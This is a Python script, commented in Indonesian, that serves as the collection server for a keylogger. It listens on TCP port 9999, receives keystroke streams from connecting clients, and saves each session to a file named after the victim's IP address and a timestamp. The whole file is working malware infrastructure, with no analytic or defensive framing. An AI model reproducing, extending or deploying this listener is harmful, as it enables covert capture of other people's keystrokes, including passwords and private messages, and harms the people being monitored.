import socket
import datetime
import os

# Tentukan folder untuk menyimpan log
LOG_DIR = "logs-keyloger"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

# --- Konfigurasi Server ---
SERVER_HOST = '0.0.0.0'
SERVER_PORT = 9999

# --- Inisialisasi Server ---
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_socket.bind((SERVER_HOST, SERVER_PORT))
server_socket.listen(1)
print(f"[*] Server listener otomatis berjalan di port {SERVER_PORT}...")

# Loop utama untuk menerima banyak koneksi, satu per satu
while True:
    try:
        client_socket, client_address = server_socket.accept()
        print(f"\n[+] Koneksi diterima dari {client_address[0]}:{client_address[1]}")
        log_data = ""

        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            decoded_data = data.decode('utf-8')
            print(decoded_data, end="", flush=True)
            log_data += decoded_data
        
        # --- PENYIMPANAN OTOMATIS ---
        if log_data.strip():
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            # Simpan log di dalam folder 'logs'
            nama_file = os.path.join(LOG_DIR, f"keylog_{client_address[0]}_{timestamp}.txt")
            
            with open(nama_file, 'w', encoding='utf-8') as f:
                f.write(log_data)
            
            print(f"\n[+] Klien terputus. Log berhasil disimpan secara otomatis sebagai: {nama_file}")
        else:
            print("\n[*] Klien terputus. Tidak ada data untuk disimpan.")
            
    except KeyboardInterrupt:
        print("\n[*] Server dihentikan oleh pengguna.")
        break
    except Exception as e:
        print(f"\n[!] Terjadi error pada listener: {e}")
    finally:
        client_socket.close()

server_socket.close()
print("[*] Server listener ditutup sepenuhnya.")
